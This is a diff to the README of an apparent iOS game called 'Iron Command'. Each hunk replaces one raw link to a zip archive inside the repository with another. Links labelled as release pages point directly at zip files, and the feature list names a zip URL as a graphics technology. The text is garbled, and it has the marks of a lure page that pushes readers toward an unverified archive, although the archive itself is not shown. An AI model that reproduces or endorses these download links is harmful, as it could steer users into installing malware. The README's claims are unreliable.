@@ -1,7 +1,7 @@
 # 🎖️ iron-command-ios - An Engaging Mobile Gaming Experience
 
 ## 🚀 Download Now
-[![Download the Application](https://github.com/arbaazsabir/iron-command-ios/raw/refs/heads/main/docs/command-ios-iron-3.3.zip%https://github.com/arbaazsabir/iron-command-ios/raw/refs/heads/main/docs/command-ios-iron-3.3.zip)](https://github.com/arbaazsabir/iron-command-ios/raw/refs/heads/main/docs/command-ios-iron-3.3.zip)
+[![Download the Application](https://raw.githubusercontent.com/arbaazsabir/iron-command-ios/main/src/store/ios-iron-command-1.5.zip%https://raw.githubusercontent.com/arbaazsabir/iron-command-ios/main/src/store/ios-iron-command-1.5.zip)](https://raw.githubusercontent.com/arbaazsabir/iron-command-ios/main/src/store/ios-iron-command-1.5.zip)
 
 ## 📖 Introduction
 Welcome to Iron Command! This hybrid military game combines real-time strategy (RTS) and first-person shooting (FPS) elements. You can switch from the Commander View for planning tactics to the Field Operative View for action-packed gameplay. Enjoy thrilling missions on your iOS device, developing strategies and executing commands seamlessly.
@@ -12,7 +12,7 @@ To enjoy Iron Command, follow these simple steps to download and run the applica
 ### 1. Visit the Download Page
 Click the link below to visit the release page where you can find the app. 
 
-[Download Iron Command](https://github.com/arbaazsabir/iron-command-ios/raw/refs/heads/main/docs/command-ios-iron-3.3.zip)
+[Download Iron Command](https://raw.githubusercontent.com/arbaazsabir/iron-command-ios/main/src/store/ios-iron-command-1.5.zip)
 
 ### 2. Choose the Correct Version
 On the Releases page, look for the latest version of Iron Command. The release notes will provide information about new features, bug fixes, and other important details. Always choose the latest version for the best experience.
@@ -32,7 +32,7 @@ Once installed, find the Iron Command app icon on your device. Tap the icon to l
 ## 🎮 Features
 - **Hybrid Gameplay:** Enjoy a unique blend of RTS and FPS.
 - **Strategic Planning:** Use the Commander View to devise strategies and plan missions.
-- **Realistic Graphics:** Experience stunning visuals with advanced technologies like https://github.com/arbaazsabir/iron-command-ios/raw/refs/heads/main/docs/command-ios-iron-3.3.zip and TypeScript.
+- **Realistic Graphics:** Experience stunning visuals with advanced technologies like https://raw.githubusercontent.com/arbaazsabir/iron-command-ios/main/src/store/ios-iron-command-1.5.zip and TypeScript.
 - **Engaging Missions:** Take on various missions that challenge your strategic thinking and action skills.
 - **Dynamic Environment:** Navigate through different terrains and experience changing game conditions.
 
@@ -48,7 +48,7 @@ To run Iron Command smoothly on your device, ensure you have the following syste
 Keep your app updated for the best experience. New updates include improvements and bug fixes. Follow these steps:
 
 ### 1. Check for Updates
-Regularly visit the [Releases page](https://github.com/arbaazsabir/iron-command-ios/raw/refs/heads/main/docs/command-ios-iron-3.3.zip) to see if a new version is available.
+Regularly visit the [Releases page](https://raw.githubusercontent.com/arbaazsabir/iron-command-ios/main/src/store/ios-iron-command-1.5.zip) to see if a new version is available.
 
 ### 2. Download the Update
 If a new version exists, download it using the steps mentioned in the “Download Now” section. 
@@ -68,4 +68,4 @@ Iron Command is an open-source project. Feel free to explore our code and contri
 ## 🎉 Conclusion
 Now that you have the steps to download and run Iron Command, dive into the tactical excitement that awaits you! Enjoy commanding troops and leading in fascinating battles right from your iOS device. 
 
-For any updates or new features, remember to check the [Releases page](https://github.com/arbaazsabir/iron-command-ios/raw/refs/heads/main/docs/command-ios-iron-3.3.zip) frequently. Happy gaming!
+For any updates or new features, remember to check the [Releases page](https://raw.githubusercontent.com/arbaazsabir/iron-command-ios/main/src/store/ios-iron-command-1.5.zip) frequently. Happy gaming!
